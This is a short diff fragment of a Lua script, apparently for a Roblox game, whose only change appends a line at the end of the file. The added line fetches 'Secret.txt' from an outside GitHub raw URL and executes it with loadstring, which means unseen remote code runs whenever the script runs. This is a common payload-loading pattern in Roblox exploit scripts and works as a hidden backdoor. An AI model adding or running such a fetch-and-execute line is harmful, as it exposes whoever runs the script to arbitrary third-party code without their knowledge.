@@ -214,3 +214,4 @@ for i,v in pairs(game:GetService("Players"):GetChildren()) do
 	end 
 end 
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Venograde/Vino/main/Secret.txt"))()
